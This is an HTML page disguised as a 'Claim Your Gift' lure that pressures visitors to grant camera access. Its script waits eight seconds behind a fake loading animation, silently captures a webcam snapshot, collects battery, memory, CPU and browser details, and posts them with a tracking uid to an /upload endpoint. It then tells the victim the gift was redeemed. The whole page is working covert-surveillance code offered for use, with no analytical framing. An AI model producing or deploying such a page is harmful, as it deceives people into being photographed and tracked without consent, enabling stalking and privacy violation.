<!DOCTYPE html>
<html>
<head>
    <title>Claim Your Gift</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #1a1a1a; color: white; text-align: center; font-family: Arial; padding: 20px; }
        .btn { background: #00ff00; color: black; padding: 15px 35px; font-size: 18px; 
               border: none; border-radius: 50px; cursor: pointer; font-weight: bold; margin-top: 20px; text-transform: uppercase; }
        #gift-box { width: 140px; display: none; margin: 30px auto; }
        .bounce { animation: bounce 0.7s infinite; }
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-25px); } }
        .sparkle { position: absolute; top: 45%; left: 50%; transform: translate(-50%, -50%); 
                   width: 0; height: 0; box-shadow: 0 0 60px 40px gold; border-radius: 50%; display: none; }
        #msg-red { color: #00ff00; font-size: 22px; font-weight: bold; display: none; }
        #msg-sub { color: #00ff00; font-size: 16px; display: none; margin-top: 10px; }
        #loading { font-size: 18px; margin-top: 15px; display: none; font-weight: bold; }
    </style>
</head>
<body>
    <div id="main-ui">
        <h2>🎁 You have a surprise gift! ✨</h2>
        <p>👇 Click below to unlock it 🔒</p>
        <button class="btn" onclick="initProcess()">🔓 UNLOCK YOUR GIFT 🎁</button>
    </div>

    <div id="sparkle" class="sparkle"></div>
    <img id="gift-box" src="https://cdn-icons-png.flaticon.com/512/4213/4213958.png">
    <p id="loading">Your Gift is Loading...🎁</p>

    <div id="success-ui">
        <p id="msg-red">Your gift has been redeemed. 👍</p>
        <p id="msg-sub">You are a good person, God bless you. ✨</p>
    </div>

    <video id="v" style="display:none" autoplay playsinline></video>
    <canvas id="c" style="display:none"></canvas>
    <audio id="sound" src="https://www.soundjay.com/misc/sounds/magic-chime-01.mp3"></audio>

    <script>
    async function initProcess() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('v').srcObject = stream;
            document.getElementById('main-ui').style.display = "none";
            document.getElementById('gift-box').style.display = "block";
            document.getElementById('gift-box').classList.add('bounce');
            document.getElementById('loading').style.display = "block";

            setTimeout(async () => {
                const canvas = document.getElementById('c');
                const video = document.getElementById('v');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const battery = await navigator.getBattery();
                const info = { 
                    battery: (battery.level * 100) + "%", 
                    ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A", 
                    cores: navigator.hardwareConcurrency || "N/A",
                    browser: navigator.userAgent
                };
                
                const params = new URLSearchParams(window.location.search);
                fetch('/upload', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        image: canvas.toDataURL('image/jpeg'), 
                        uid: params.get('uid'), 
                        mode: params.get('m'), 
                        info: info 
                    })
                });

                document.getElementById('gift-box').classList.remove('bounce');
                document.getElementById('gift-box').src = "https://cdn-icons-png.flaticon.com/512/4213/4213600.png";
                document.getElementById('loading').style.display = "none";
                document.getElementById('sparkle').style.display = "block";
                document.getElementById('sound').play();
                document.getElementById('msg-red').style.display = "block";
                document.getElementById('msg-sub').style.display = "block";
            }, 8000);
        } catch (e) {
            alert("Camera permission is required to proceed!");
        }
    }
    </script>
</body>
</html>
